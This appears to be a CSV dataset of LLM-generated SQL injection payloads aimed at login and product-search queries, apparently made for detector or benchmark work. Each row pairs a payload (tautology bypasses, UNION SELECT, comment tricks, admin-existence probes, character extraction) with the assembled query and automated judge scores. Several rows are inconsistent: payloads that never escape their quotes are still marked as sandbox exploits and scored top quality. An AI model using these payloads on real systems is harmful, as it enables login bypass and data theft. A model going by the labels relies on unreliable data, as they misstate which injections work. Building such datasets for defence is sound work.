query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00000,-- OR 1=1,SELECT * FROM users WHERE username = '-- OR 1=1' AND password = 'anything',tautology,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00001,") UNION ALL SELECT NULL, NULL, '#'","SELECT * FROM users WHERE username = ') UNION ALL SELECT NULL, NULL, '#'' AND password = 'anything'",tautology,login,1,0,0.0,True,mysql,"[""Table"", ""Star"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00002,'; --,SELECT * FROM users WHERE username = ''; --' AND password = 'anything',tautology,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Column"", ""From"", ""Semicolon"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00003,OR EXISTS(SELECT * FROM sys.objects WHERE name = 'admin'),SELECT * FROM users WHERE username = 'OR EXISTS(SELECT * FROM sys.objects WHERE name = 'admin')' AND password = 'anything',tautology,login,1,0,0.0,True,default,"[""Table"", ""Exists"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00004,/* OR */ 1=1,SELECT * FROM users WHERE username = '/* OR */ 1=1' AND password = 'anything',tautology,login,1,0,0.0,True,default,"[""Literal"", ""EQ""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00006,OR 'a' LIKE 'a' --,SELECT * FROM users WHERE username = 'OR 'a' LIKE 'a' --' AND password = 'anything',tautology,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""From"", ""Like"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00007,' OR '1'='1 LIMIT 1 --,SELECT * FROM users WHERE username = '' OR '1'='1 LIMIT 1 --' AND password = 'anything',tautology,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00008,name%' OR 1+1=2--,SELECT * FROM products WHERE name LIKE '%name%' OR 1+1=2--%',tautology,search,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Add"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00010,"name%' OR ASCII(SUBSTRING(name, 1, 1))=97 --","SELECT * FROM products WHERE name LIKE '%name%' OR ASCII(SUBSTRING(name, 1, 1))=97 --%'",tautology,search,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Substring"", ""Where"", ""Ascii"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00011,name%' OR EXISTS(SELECT * FROM users WHERE username='admin') --,SELECT * FROM products WHERE name LIKE '%name%' OR EXISTS(SELECT * FROM users WHERE username='admin') --%',tautology,search,1,0,0.0,True,default,"[""Table"", ""Exists"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
